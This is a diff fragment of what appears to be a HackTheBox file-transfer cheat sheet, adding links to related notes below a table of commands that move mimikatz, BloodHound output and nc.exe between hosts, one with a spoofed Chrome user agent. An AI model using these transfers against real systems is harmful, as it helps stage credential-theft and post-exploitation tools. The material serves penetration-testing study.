@@ -712,3 +712,9 @@ passwd                                                                          
 | `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip` | Upload a file using SCP |
 | `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe` | Download a file using SCP |
 | `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |
+
+
+## Related
+- [File Transfer Cheatsheet](notes/hacking/htb-file-transfer-cheatsheet.md)
+- [Netcat](notes/hacking/netcat.md)
+- [Files Transfer - HTB Writeup](notes/hacking/files-transfer-htb-writeup.md)
